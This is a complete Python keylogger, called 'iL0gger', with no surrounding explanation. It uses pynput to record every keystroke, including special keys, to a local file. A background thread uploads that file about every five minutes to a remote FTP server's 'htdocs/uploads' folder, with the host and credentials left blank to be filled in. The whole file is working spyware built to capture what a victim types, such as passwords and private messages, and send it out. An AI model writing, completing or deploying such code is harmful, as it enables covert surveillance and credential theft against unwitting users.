import os
import time
import threading
from pynput import keyboard
from ftplib import FTP

class iL0gger:
    def __init__(self, log_file="file.txt"):
        self.log = "iL0gger has started...\n"
        self.log_file = log_file

        upload_thread = threading.Thread(target=self.upload_timer, daemon=True)
        upload_thread.start()

    def upload_timer(self):
        while True:
            time.sleep(295)
            self.upload_log()

    def upload_log(self):
        ftp_host = ""
        ftp_user = ""
        ftp_pass = ""

        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        new_filename = f"file_{timestamp}.txt"

        try:
            ftp = FTP(ftp_host)
            ftp.login(ftp_user, ftp_pass)
            ftp.cwd("htdocs/uploads")
        
            with open("file.txt", "rb") as file:
                ftp.storbinary(f"STOR {new_filename}", file)

            print(f"File succesfully uploaded -> {new_filename}")
            ftp.quit()

        except Exception as e:
            print(f"FTP error {e}")



    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = f" [{str(key)}] "

        with open(self.log_file, "a") as file:
            file.write(current_key)

    def start(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

if __name__ == "__main__":
    il0gger = iL0gger()
    
    
    il0gger.start()
